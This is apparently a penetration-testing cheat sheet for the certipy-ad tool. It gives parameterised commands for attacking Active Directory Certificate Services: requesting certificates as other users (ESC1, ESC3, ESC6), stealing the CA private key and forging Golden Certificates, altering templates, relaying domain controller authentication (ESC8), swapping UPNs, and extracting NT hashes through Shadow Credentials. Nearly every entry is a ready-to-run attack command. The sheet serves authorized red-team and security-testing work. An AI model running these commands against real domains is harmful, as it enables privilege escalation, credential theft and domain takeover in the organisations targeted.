# certipy-ad

% adcs, certificate, pki, windows, Active directory, template, shadow credential

## certipy-ad - list certificate templates
#plateform/linux #target/remote #cat/RECON
```
certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> 
```

## certipy-ad - request certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -target <CA-FQDN> -template <TEMPLATE> -ca <CA_NAME>
```

## certipy-ad - authenticate with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certipy-ad auth -pfx <PFX-FILE> -dc-ip <DC-IP>
```

## certipy-ad - authenticate through LDAP (Schannel) with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certipy-ad auth -pfx <PFX-FILE> -dc-ip <DC-IP> -ldap-shell
```

## certipy-ad - Golden Certificate - steal CA certificate and private key
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ns '<nameServer>' -target '<DOMAIN>' -config '<DOMAIN>\CORP-CA' -backup
```

## certipy-ad - Golden Certificate - forge certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad forge -ca-pfx '<ca-pfx-file>' -upn '<USER>@<DOMAIN>' -sid '<sid>' -crl 'ldap:///'
```

## certipy-ad - request certificate for another user - ESC1 - ESC6
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -target <CA-FQDN> -template <TEMPLATE> -ca <CA_NAME> -upn <USER>@<DOMAIN>
```

## certipy-ad - request certificate on behalf of with Certificate Request Agent certificate - ESC3
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -target <CA-FQDN> -template <TEMPLATE> -ca <CA_NAME> -on-behalf-of '<DOMAIN>\<USER>' -pfx <PFX-FILE>
```

## certipy-ad - modify template in order to make it vulnerable to ESC1 - ESC4
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE>
```

## certipy-ad - Issue certificate for specific request id - ESC7
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA_NAME> -issue-request <csr-id>
```

## certipy-ad - relay authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad relay -ca <CA-FQDN>
```

## certipy-ad - relay domain controller authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad relay -ca <CA-FQDN> -template 'DomainController'
```

## certipy-ad - Modify user upn to another one - ESC9 - ESC10
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad account update -u <USER>@<DOMAIN> -p '<PASSWORD>' -user <USER> -upn <administrator-user>
```

## certipy-ad - Get NT hash - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
```
certipy-ad shadow auto -u <USER>@<DOMAIN> -p '<PASSWORD>' -account <USER>
```

## certipy-ad - ESC13
```
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -target '<ADCS_HOST>' -ca '<CA_NAME>' -template '<TEMPLATE>'
```

## certipy-ad - ESC15 step 1
Request a certificate with 'Certificate Request Agent' application policy
```
certipy-ad req -u <USER>@<DOMAIN> --application-policies '1.3.6.1.4.1.311.20.2.1' -ca <CA_NAME> -template <TEMPLATE> -dc-ip <DC_IP>
```

## certipy-ad - ESC15 step 2
Use the certificate in a ESC3 scenario to ask for a new certificate on behalf of another user
```
USE ESC3
```
